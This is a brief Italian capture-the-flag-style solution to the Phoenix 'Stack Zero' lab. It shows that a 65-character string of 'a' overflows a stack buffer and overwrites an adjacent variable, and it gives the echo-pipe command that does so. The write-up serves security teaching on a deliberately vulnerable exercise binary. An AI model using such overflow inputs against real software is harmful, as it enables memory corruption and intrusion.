# [Stack Zero](https://exploit.education/phoenix/stack-zero/)

Inserire `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa` come input. 

L'ultima `a` manda `buffer` in overflow, impostando il valore di `changeme` ad `'a'`, ovvero `97`.

## Soluzione

```bash
echo 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' | ./stack-zero
```
